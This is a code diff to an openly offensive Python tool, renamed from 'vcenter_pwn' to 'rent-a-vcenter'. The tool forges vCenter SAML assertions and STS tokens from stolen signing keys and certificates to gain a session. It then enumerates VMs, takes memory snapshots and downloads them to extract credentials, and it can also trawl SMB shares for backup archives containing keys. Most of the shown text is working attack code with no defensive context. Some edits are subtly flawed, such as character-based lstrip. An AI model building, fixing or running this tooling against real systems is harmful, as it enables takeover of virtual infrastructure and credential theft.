@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-vcenter_pwn — vCenter SAML golden ticket: session cookie, VM memory dump, credential extraction.
-Usage: vcenter_pwn.py TARGET --local-path PATH [-p PASS] [-d DOMAIN] [-v] [-y]
+rent-a-vcenter — vCenter SAML golden ticket: session cookie, VM memory dump, credential extraction.
+Usage: rent-a-vcenter.py TARGET --local-path PATH [-p PASS] [-d DOMAIN] [-v] [-y]
 """
 
 import argparse
@@ -32,7 +32,8 @@ warnings.filterwarnings('ignore', category=DeprecationWarning)
 
 def _need(pkg, pip_name=None, attr=None):
     try:
-        mod = __import__(pkg)
+        import importlib
+        mod = importlib.import_module(pkg)
         return getattr(mod, attr) if attr else mod
     except ImportError:
         sys.exit(f'[-] Missing dependency: pip install {pip_name or pkg}')
@@ -208,7 +209,7 @@ def _valid_pem(pem: str) -> bool:
 
 def _load_der_cert(raw: bytes) -> bool:
     try:
-        crypto = _need('OpenSSL.crypto', 'pyOpenSSL', attr='crypto')
+        crypto = _need('OpenSSL.crypto', 'pyOpenSSL')
         crypto.load_certificate(crypto.FILETYPE_ASN1, raw)
         return True
     except Exception:
@@ -326,7 +327,8 @@ def extract_cert2(stream: MmapStream, verbose=False) -> str:
             print('[+] Extracted trusted CA cert')
             return pem
 
-    sys.exit('[-] Could not extract trusted CA cert from data.mdb')
+    print('[-] Could not extract trusted CA cert from data.mdb — continuing without it')
+    return None
 
 
 def certs_from_mdb(mdb_path: Path, verbose=False):
@@ -415,7 +417,8 @@ def _try_extract_sol_creds(arc_path: Path):
     """Try to pull vcsoluser key+cert from a single tar.gz. Returns (key, cert) PEM or (None, None)."""
     try:
         with tarfile.open(arc_path) as tf:
-            members = {m.name: m for m in tf.getmembers()}
+            # Normalize member names: strip leading './' so both './etc/...' and 'etc/...' match
+            members = {m.name.lstrip('./'): m for m in tf.getmembers()}
             key_m  = members.get(_SOL_KEY_PATH)
             cert_m = members.get(_SOL_CERT_PATH)
             if key_m and cert_m:
@@ -489,7 +492,7 @@ _X509_VTYPE  = 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-tok
 
 def _exc_c14n(elem) -> bytes:
     """Exclusive C14N of an lxml element."""
-    etree = _need('lxml.etree', 'lxml', attr='etree')
+    etree = _need('lxml.etree', 'lxml')
     return etree.tostring(elem, method='c14n', exclusive=True, with_comments=False)
 
 
@@ -505,7 +508,7 @@ def _build_wstrust_envelope(key_pem: str, cert_pem: str, domain: str) -> bytes:
     from cryptography.hazmat.primitives import hashes, serialization
     from cryptography.hazmat.primitives.asymmetric import padding as _pad
     from cryptography.x509 import load_pem_x509_certificate
-    etree = _need('lxml.etree', 'lxml', attr='etree')
+    etree = _need('lxml.etree', 'lxml')
 
     now         = datetime.now(timezone.utc)
     ts_created  = now.strftime('%Y-%m-%dT%H:%M:%SZ')
@@ -613,7 +616,7 @@ def sts_issue_bearer_token(target: str, key_pem: str, cert_pem: str,
     """
     import requests as req
     req.packages.urllib3.disable_warnings()
-    etree = _need('lxml.etree', 'lxml', attr='etree')
+    etree = _need('lxml.etree', 'lxml')
 
     body = _build_wstrust_envelope(key_pem, cert_pem, domain)
 
@@ -669,7 +672,7 @@ def _build_wstrust_hok_envelope(key_pem: str, cert_pem: str, domain: str) -> byt
     from cryptography.hazmat.primitives import hashes, serialization
     from cryptography.hazmat.primitives.asymmetric import padding as _pad
     from cryptography.x509 import load_pem_x509_certificate
-    etree = _need('lxml.etree', 'lxml', attr='etree')
+    etree = _need('lxml.etree', 'lxml')
 
     now         = datetime.now(timezone.utc)
     ts_created  = now.strftime('%Y-%m-%dT%H:%M:%SZ')
@@ -772,7 +775,7 @@ def sts_issue_hok_token(target: str, key_pem: str, cert_pem: str,
     """
     import requests as req
     req.packages.urllib3.disable_warnings()
-    etree = _need('lxml.etree', 'lxml', attr='etree')
+    etree = _need('lxml.etree', 'lxml')
 
     body = _build_wstrust_hok_envelope(key_pem, cert_pem, domain)
 
@@ -990,7 +993,7 @@ def soap_list_vms(target: str, vim_cookie: str, verbose=False) -> list:
     """Enumerate all VMs via SOAP PropertyCollector using the VIM session cookie."""
     import requests as req
     req.packages.urllib3.disable_warnings()
-    etree = _need('lxml.etree', 'lxml', attr='etree')
+    etree = _need('lxml.etree', 'lxml')
 
     try:
         r = req.post(
@@ -1047,8 +1050,8 @@ _CREATE_SNAP_TMPL = '''\
   <SOAP-ENV:Body>
     <CreateSnapshot_Task xmlns="urn:vim25">
       <_this type="VirtualMachine">{vm_moref}</_this>
-      <name>vcpwn-memdump</name>
-      <description>Memory snapshot by vcenter_pwn</description>
+      <name>rav-memdump</name>
+      <description>rent-a-vcenter memory snapshot</description>
       <memory>true</memory>
       <quiesce>false</quiesce>
     </CreateSnapshot_Task>
@@ -1061,7 +1064,7 @@ def soap_wait_for_task(target: str, vim_cookie: str, task_moref: str,
     """Poll a task until it reaches state success or error. Returns True on success."""
     import requests as req
     req.packages.urllib3.disable_warnings()
-    etree = _need('lxml.etree', 'lxml', attr='etree')
+    etree = _need('lxml.etree', 'lxml')
 
     body = f'''<?xml version="1.0" encoding="UTF-8"?>
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
@@ -1160,7 +1163,7 @@ def soap_create_snapshot(target: str, vim_cookie: str, vm_moref: str,
     """Create a memory snapshot via SOAP. Returns task MOREF or ''."""
     import requests as req
     req.packages.urllib3.disable_warnings()
-    etree = _need('lxml.etree', 'lxml', attr='etree')
+    etree = _need('lxml.etree', 'lxml')
 
     body = _CREATE_SNAP_TMPL.replace('{vm_moref}', vm_moref)
     try:
@@ -1209,7 +1212,7 @@ def discover_local(path: str) -> list:
 
 
 def discover_smb(smb_url: str, user: str, password: str, domain: str) -> list:
-    SMBConnection = _need('impacket.smbconnection', 'impacket', attr='SMBConnection')
+    SMBConnection = _need('impacket.smbconnection', 'impacket.smbconnection', attr='SMBConnection')
     m = re.match(r'//([^/]+)/([^/]+)', smb_url)
     if not m:
         sys.exit(f'[-] Invalid SMB URL (expected //HOST/SHARE): {smb_url}')
@@ -1220,7 +1223,7 @@ def discover_smb(smb_url: str, user: str, password: str, domain: str) -> list:
     smb.login(user or '', password or '', domain or '')
     print('[+] SMB authenticated')
 
-    tmp   = Path(tempfile.mkdtemp(prefix='vcpwn_smb_'))
+    tmp   = Path(tempfile.mkdtemp(prefix='rav_smb_'))
     found = []
 
     def _walk(smb_path=''):
@@ -1285,7 +1288,7 @@ def _tls_ctx():
 
 
 def get_vcenter_hostname(target: str) -> str:
-    crypto = _need('OpenSSL.crypto', 'pyOpenSSL', attr='crypto')
+    crypto = _need('OpenSSL.crypto', 'pyOpenSSL')
     try:
         s = socket.socket()
         s.connect((target, 443))
@@ -1313,7 +1316,7 @@ def get_saml_authn_request(target: str):
             if m:
                 compressed = base64.b64decode(urllib.parse.unquote(m.group(1)))
                 xml_bytes  = zlib.decompress(compressed, -8)
-                etree = _need('lxml.etree', 'lxml', attr='etree')
+                etree = _need('lxml.etree', 'lxml')
                 root  = etree.fromstring(xml_bytes)
                 return root.get('ID', '_default')
     except Exception:
@@ -1325,7 +1328,7 @@ def build_and_sign_saml(target: str, hostname: str, domain: str,
                          key_pem: str, cert1_pem: str, cert2_pem: str,
                          authn_id: str) -> bytes:
     from datetime import datetime, timezone, timedelta
-    etree     = _need('lxml.etree', 'lxml', attr='etree')
+    etree     = _need('lxml.etree', 'lxml')
     XMLSigner = _need('signxml', 'signxml', attr='XMLSigner')
 
     now    = datetime.now(timezone.utc)
@@ -1348,7 +1351,7 @@ def build_and_sign_saml(target: str, hostname: str, domain: str,
 
     signer = XMLSigner(c14n_algorithm='http://www.w3.org/2001/10/xml-exc-c14n#')
     signed = signer.sign(root, reference_uri=assertion_id,
-                         key=key_pem, cert=[cert1_pem, cert2_pem])
+                         key=key_pem, cert=[c for c in [cert1_pem, cert2_pem] if c])
     return etree.tostring(signed, xml_declaration=True, encoding='UTF-8', pretty_print=False)
 
 
@@ -2001,7 +2004,7 @@ def _download_memory_files(vc: 'VCenterSession', vm_name: str, vm_path: str,
 
 def parse_args():
     ap = argparse.ArgumentParser(
-        prog='vcenter_pwn',
+        prog='rent-a-vcenter',
         description='vCenter SAML golden ticket — session cookie, VM memory dump, credential extraction',
     )
     ap.add_argument('target', metavar='TARGET', help='vCenter IP or hostname')
@@ -2032,7 +2035,7 @@ def parse_args():
 
 def main():
     args = parse_args()
-    work_dir   = Path(tempfile.mkdtemp(prefix='vcpwn_'))
+    work_dir   = Path(tempfile.mkdtemp(prefix='rav_'))
     output_dir = Path(args.out)
     try:
         if args.local_path:
